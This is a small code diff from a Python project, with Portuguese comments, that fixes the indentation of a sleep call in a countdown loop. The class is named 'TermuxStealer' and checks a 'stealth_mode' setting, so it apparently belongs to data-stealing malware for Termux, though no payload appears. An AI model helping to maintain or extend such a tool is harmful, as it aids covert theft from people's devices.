@@ -288,8 +288,7 @@ class TermuxStealer:
                 # Contagem regressiva
                 for i in range(wait, 0, -1):
                     if i % 60 == 0 and not CONFIG["stealth_mode"]:
-                    
-                    time.sleep(1)
+                        time.sleep(1)
                     
         except KeyboardInterrupt:
             
